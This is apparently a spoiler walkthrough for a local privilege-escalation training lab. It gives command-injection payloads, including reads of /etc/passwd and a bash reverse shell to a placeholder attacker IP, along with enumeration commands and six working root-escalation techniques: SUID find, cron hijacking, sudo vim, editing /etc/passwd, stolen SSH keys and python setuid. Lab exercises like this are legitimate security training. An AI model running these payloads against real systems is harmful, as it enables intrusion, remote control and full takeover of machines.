# Privesc Lab - Walkthrough

> **SPOILERS BELOW** - Try to solve it yourself first!

## Phase 1: Initial Foothold

The web app at `http://localhost:8080` has a **command injection** vulnerability
in the `/ping` endpoint. The `host` parameter is passed directly to a shell command.

**Example payloads:**
```
; id
; cat /etc/passwd
; cat /home/webuser/user_flag.txt
8.8.8.8; whoami
```

To get a reverse shell (from inside the container):
```
; bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
```

Or simply SSH in:
```bash
ssh webuser@localhost -p 2222
# Password: websecure123
```

---

## Phase 2: Enumeration

Once you have a shell as `webuser`, enumerate privesc vectors:

```bash
# Check SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check sudo permissions
sudo -l

# Check writable files
find / -writable -type f 2>/dev/null

# Check cron jobs
cat /etc/cron.d/*
ls -la /opt/scripts/

# Check capabilities
getcap -r / 2>/dev/null

# Check for readable SSH keys
find / -name "id_*" -readable 2>/dev/null
```

---

## Phase 3: Privilege Escalation (6 Vectors)

### Vector 1: SUID `find`
```bash
find . -exec /bin/bash -p \;
```

### Vector 2: Writable cron job
```bash
echo '#!/bin/bash' > /opt/scripts/backup.sh
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/scripts/backup.sh
# Wait ~1 minute for cron to run
/tmp/rootbash -p
```

### Vector 3: Sudo vim
```bash
sudo vim -c '!bash'
```

### Vector 4: Writable /etc/passwd
```bash
# Generate a password hash
openssl passwd -1 hacked
# Add a root-level user
echo 'hacker:HASH_HERE:0:0::/root:/bin/bash' >> /etc/passwd
su hacker
```

### Vector 5: Readable root SSH key
```bash
ssh -i /root/.ssh/id_ed25519 root@localhost
```

### Vector 6: Python3 capabilities (CAP_SETUID)
```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

## Flag

```bash
cat /root/flag.txt
# FLAG{you_got_root_congrats}
```
